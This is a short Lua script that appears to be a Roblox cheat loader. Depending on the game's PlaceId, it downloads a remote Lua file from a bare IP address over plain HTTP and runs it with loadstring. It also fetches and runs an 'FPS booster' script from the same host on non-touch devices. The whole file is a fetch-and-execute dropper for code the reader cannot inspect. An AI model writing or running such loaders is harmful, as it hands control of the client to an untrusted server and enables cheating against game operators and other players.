if not game:IsLoaded() then
    game.Loaded:Wait()
end

if game.PlaceId == 4639625707 then
    loadstring(game:HttpGetAsync("http://45.146.255.5:8100/War8834839T39oon.lua"))()
elseif game.PlaceId == 286090429 then
    loadstring(game:HttpGetAsync("http://45.146.255.5:8100/A42n134l.lua"))()
else
    loadstring(game:HttpGetAsync("http://45.146.255.5:8100/Uni377629a23l.lua"))()
end

local UserInputService = game:GetService("UserInputService")

if not UserInputService.TouchEnabled then
    loadstring(game:HttpGet("http://45.146.255.5:8100/UWPFPSBooster.lua"))()
end